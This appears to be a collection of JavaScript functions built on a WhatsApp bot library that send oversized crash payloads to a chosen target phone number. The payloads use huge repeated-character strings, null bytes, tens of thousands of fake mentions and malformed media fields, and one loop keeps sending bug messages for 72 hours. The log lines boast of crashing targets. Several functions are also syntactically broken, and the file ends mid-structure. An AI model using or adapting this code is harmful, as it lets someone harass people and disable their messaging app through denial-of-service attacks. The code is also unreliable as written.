async function crashbeta(target, ptcp = false) {
let BetaFc = "KekuatanBatangHitam" + "ꦾ".repeat(250000);

const messageContent = {
    ephemeralMessage: {
        message: {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 0,
                        caption: BetaFc,
                        sequenceNumber: "",
                        jpegThumbnail: null
                    },
                    body: {
                        text: BetaFc
                    },
                    nativeFlowMessage: {}, // If needed, specify more details here
                    contextInfo: {
                     contactVcard: true,
                        mentionedJid: [m.chat],
                        groupMentions: [
                            { 
                                groupJid: "@120363321780343299@g.us", 
                                groupSubject: "mengjawa" 
                            }
                        ]
                    }
                }
            }
        }
    }
}
}


async function homestuck(conn, target) {
    const heavyChar = 'ꦾ'.repeat(15000); 
    const superHeavy = 'ꦾ'.repeat(150000); 

    const payload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: heavyChar,
                        hasMediaAttachment: false
                    },
                    footer: {
                        text: superHeavy
                    },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            text: heavyChar,
                            footer: heavyChar,
                            title: heavyChar,
                        })
                    },
                    contextInfo: {
                        mentionedJid: ["0@s.whatsapp.net"],
                        forwardingScore: 999999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    await conn.relayMessage(target, { message: payload }, { messageId: undefined });
}

async function lonte-kau(target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 99,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "lonte kau?" + "ꦾ".repeat(17000),
                    },
                    header: {
                        title: "gantengbanget" + "\u0000".repeat(9000),
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4",
                            mimetype: "image/jpeg",
                            fileSha256: "pNyO2Pbdf+gxvBQF6Tgrdy90z+3dFq1JkgoYdPQGqY8=",
                            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                            directPath: "/v/t62.7119-24/40377567.enc?ccb=11-4",
                            mediaKeyTimestamp: "1721344123",
                            jpegThumbnail: Buffer.alloc(5000),
                        },
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "warming",
                                    sections: [{
                                        title: "1warming",
                                        rows: [{ title: "guntung", description: "不可逆転"}]
                                    }]
                                }),
                            },
                            {
                                name: "payment_method",
                                buttonParamsJson: JSON.stringify({
                                    payment_config: { currency: "USD", amount_1000: 999999999 }
                                }),
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: JSON.stringify({
                                    metadata: { type: "crash", info: "force crash" }
                                }),
                            },
                        ],
                    },
                },
            },
        },
    };

    await conn.relayMessage(target, message, {
        messageId: "CRASH_" + Date.now(),
        participant: { jid: target }
    });

    console.log(" sistem ui gassin sent to:", target);
}


async function hanyaterkentot(target) {
    const message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        title: "\u200b".repeat(99999), 
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc",
                            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                            fileSha256: Buffer.from("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", 'base64'),
                            fileLength: "9999999999",
                            pageCount: 999999,
                            mediaKey: Buffer.from("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", 'base64'),
                            fileName: "\u200b".repeat(99999),
                            fileEncSha256: Buffer.from("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=", 'base64'),
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc",
                            mediaKeyTimestamp: "9999999999999",
                            jpegThumbnail: Buffer.from("")
                        }
                    },
                    body: {
                        text: "ZyluxGantengBanget" + "ꦾ".repeat(115000),
                    },
                    footer: {
                        text: "\u200b".repeat(99999)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 10 }).map(() => ({
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "\u200b".repeat(9999),
                                description: "\u200b".repeat(9999),
                                options: [{
                                    title: "\u200b".repeat(9999),
                                    description: "\u200b".repeat(9999)
                                }]
                            })
                        }))
                    }
                }
            }
        }
    };

    await conn.relayMessage(target, message, { messageId: "ZYLUX_TOTAL_FC_" + Date.now() });
    console.log("TARGET UDH DEAT:", target);
}

async function Zyluxtestee(conn, target) {
    const payload = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "lu kenal zylux gak" + "ꦾ".repeat(66666),
                    matchedText: "masa gak kenal zylux." + "ꦾ".repeat(15000),
                    canonicalUrl: "https://google.com",
                    title: "Lu kenal zylux",
                    description: "Lu kenal zylux!",
                    jpegThumbnail: Buffer.alloc(99999),
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: true,
                            title: "ZyLux",
                            body: "KUNTIL.MOB",
                            previewType: "PHOTO",
                            mediaUrl: "https://google.com",
                            mediaType: 1,
                            renderLargerThumbnail: true,
                            thumbnail: Buffer.alloc(99999),
                            sourceUrl: "https://google.com",
                        },
                    },
                },
            },
        },
    };

    await conn.sendMessage(target, payload, { quoted: m });
}


async function delaystik(target) {
    const stickerMsg = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQP9UVye8O2Bior59KC5z_wfwU5R2a0WLyrJq06W_V8mWHjCnfwVzeQWXJrDd8RwQS9l3hmm_1xUeSVvh6P8Wmy5-SlXaeLNhiK-JbU9ig?ccb=9-4&oh=01_Q5Aa1wGcCp0xmmVBo0nAE75tD2TOU5QagOW4PqtEazHrnrcWlQ&oe=68738B1F&_nc_sid=e6ed6c&mms3=true",
                    mimetype: "image/webp",
                    fileSha256: "CPAfk26ALMVxEXAU8l13xFWVEGzPOywhDumcBY1ae9I=",
                    fileEncSha256: "c8wbpsZNP5Dtc7ZqHRax9K87Ar79n9/Ac/1ZNeRVgYU=",
                    mediaKey: "xhDbY4kRvDaBKNip2Cb0CwXG+STh26mmuSpr2wNLWVU=",
                    directPath: "/o1/v/t24/f2/m231/AQP9UVye8O2Bior59KC5z_wfwU5R2a0WLyrJq06W_V8mWHjCnfwVzeQWXJrDd8RwQS9l3hmm_1xUeSVvh6P8Wmy5-SlXaeLNhiK-JbU9ig?ccb=9-4&oh=01_Q5Aa1wGcCp0xmmVBo0nAE75tD2TOU5QagOW4PqtEazHrnrcWlQ&oe=68738B1F&_nc_sid=e6ed6c",
                    mediaKeyTimestamp: "1680000000" // bisa random valid timestamp
                }
            }
        }
    };

    const message = generateWAMessageFromContent(target, stickerMsg, {});

    await conn.relayMessage(target, message.message, { messageId: message.key.id });
}

async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𝚢𝚊𝚑𝚊𝚑𝚊 𝚗𝚐𝚎𝚕𝚊𝚐",
                    footerText: "𝙳𝚛𝚎𝚊𝚍𝚘𝚜𝙵𝚘𝚛𝚝𝚎𝚡 𝚒𝚜 𝚋𝚊𝚌𝚔 ༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await rage.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await rage.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "⟅̊༑ ▾𝚖𝚊𝚔𝚕𝚞⟅̊༑ ▾ " },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }



        async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "𝚖𝚊𝚗𝚞𝚜𝚒𝚊 𝚕𝚎𝚖𝚊𝚑",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await rage.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await rage.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "DreadosFortex is back ▾" },
                             content: undefined
}
]
}
);
}
}



async function killyou(conn, target) {
    const killerChar = 'ꦾ'.repeat(15000); 
    const invisibleChar = '\u2060'.repeat(50000); 

    const mediaItems = Array.from({ length: 15 }, (_, i) => ({
        imageMessage: {
            url: https://speed.hetzner.de/1GB.bin?i=${i}, 
            mimetype: "image/jpeg",
            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
            fileEncSha256: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
            mediaKey: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC=",
            directPath: /media/fakepath_${i}.enc,
            fileLength: { low: 1073741824, high: 0, unsigned: true }, 
            mediaKeyTimestamp: { low: 999999999, high: 0, unsigned: false },
            jpegThumbnail: Buffer.from([]),
            contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                mentionedJid: Array.from({ length: 5000 }, () => 
                    "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
                ),
                externalAdReply: {
                    showAdAttribution: true,
                    title: killerChar,
                    body: invisibleChar,
                    mediaUrl: "https://google.com", 
                    mediaType: 1,
                    thumbnail: Buffer.from([]),
                    sourceUrl: "https://google.com",
                    renderLargerThumbnail: true
                }
            }
        }
    }));

    const album = {
        viewOnceMessage: {
            message: {
                albumMessage: {
                    messageList: mediaItems
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, album, {
        quoted: null,
        messageId: "Crash_" + Date.now()
    });

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    console.log(Kroco banget kamu ${target});
}




async function kuntul1(target) { 
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "\u2060".repeat(95000),
        rows: [{ title: ${r + 1}, id: ${r + 1} }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nanda is Ganteng",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // Cek apakah mention true sebelum menjalankan relayMessage
    if (target) {
        await conn.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Nanda Is Here! " },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function kuntul2(target) {
    const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "\u200C".repeat(95000),
        rows: [{ title: ${r + 1}, id: ${r + 1} }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nanda is Ganteng",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🔴" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => 
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,

isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "333333333333@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "Dont Bothering Me Bro!!!"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    // Cek apakah mention true sebelum menjalankan relayMessage
    if (target) {
        await conn.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Nanda Is Here! " },
                        content: undefined
                    }
                ]
            }
        );
    }
}



async function notifayang(target, Ptcp = true) {
  let virtex = "ZYOUUU KILL YOUU🗿" + "ꦾ".repeat(15000);
  await conn.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: virtex,
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: virtex,
              hasMediaAttachment: true,
            },
            body: {
              text: virtex,
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
              groupMentions: [
                { groupJid: "1@s.whatsapp.net", groupSubject: "ꦾꦾꦾꦾ" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: target } },
    { messageId: null }
  );
}




async function execDelay(target, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 1000) {
        await exDelay(target);
        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/1000 target> ${target}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 1000 Messages to ${target}`));
        count = 0;
        console.log(chalk.red("➡️ Next 1000 Messages"));
      }
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

async function exDelay(target) {
await tdx.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `XrL ~ Dominations\n https://t.me/xrellyy\n`,
contextInfo: {
mentionedJid: [
"6285215587498@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
}
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}


async function ContactXIos(target) {
        for (let i = 0; i < 5; i++) {
            const contactBug = await generateWAMessageFromContent(target, {
                contactMessage: {
                    displayName: "🦠⃰‌°‌‌•⃟ ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" + "𑇂𑆵𑆴𑆿".repeat(500),
                    vcard: "BEGIN:VCARD\nVERSION:3.0\nN:🦠⃰‌°‌‌•⃟ ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666\nFN:🦠⃰‌°‌‌•⃟ ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666\nORG:\nTITLE:\nitem1.TEL;waid=nomorny\nitem1.X-ABLabel:Celular\nX-WA-BIZ-NAME:\nEND:VCARD",
                    jpegThumbnail: imagee,
                    contextInfo: {
                        forwardingScore: 508,
                        isForwarded: true,
                        externalAdReply: {
                            title: 'X ' + "𑇂𑆵𑆴𑆿".repeat(5000),
                            body: 'X' + "𑇂𑆵𑆴𑆿".repeat(5000),
                            mediaType: 1,
                            renderLargerThumbnail: false,
                            showAdAttribution: true,
                            thumbnail: imagee,
                            jpegThumbnail: imagee,
                            mediaUrl: `https://t.me/xrelly`,
                            sourceUrl: `https://t.me/xrelly`
                        }
                    }
                }
            }, {
                ephemeralExpiration: 5,
                timeStamp: Date.now()
            });

            await client.relayMessage(target, contactBug.message, {
                messageId: contactBug.key.id
            });
}


    async function holdSqL(target) {

async function holdbug(target) {
await client.relayMessage(
"status@broadcast", {
extendedTextMessage: {
text: `${`${"\u0000"}`}`,
contextInfo: {
mentionedJid: [
"696969696969@s.whatsapp.net",
...Array.from({
length: 40000
}, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
]
quotedMessage: {
nativeFlowMessage: {
messageParamsJson: "{".repeat(100000)
}
},
},
}
}, {
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
}
);
}

async function invisSqL(isTarget) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [isTarget],
                participant: isTarget,
                remoteJid: isTarget,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await client.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}


async function newsletterSqL(target, ptcp = true) {
    
    const img300 = require('./folder/folder/image.jpg')
    
    const mentionedList = [
    target, ...Array.from({ length: 35000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '1@newsletter',
                        newsletterName: "",
                        jpegThumbnail: img300,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + 9999999999,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: client.generateMessageTag(),
            },
        };

        await client.relayMessage(target, message, {
          userJid: target,
        });
    } catch (error) {
        console.log("error:\n" + error);
    }
}



async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: client.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
